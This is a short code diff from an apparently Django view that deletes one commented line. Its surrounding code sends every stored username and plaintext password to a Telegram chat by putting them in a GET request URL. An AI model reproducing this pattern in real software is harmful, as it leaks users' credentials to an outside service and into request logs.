@@ -470,7 +470,6 @@ def llavePublica(request):
     	  usuarios = Credencial.nick
     	  
     	  if llave_publica == llave_publica_almacenada:
-    	  	#mensaje = 'nombre de la cuenta: ' + usuarios + ' password: ' + passwords
     	  	for credencial in passwords:
     	  		mensaje_enviado = 'https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&parse_mode=Markdown&text=' + credencial.nick + credencial.password
     	  		requests.get(mensaje_enviado)
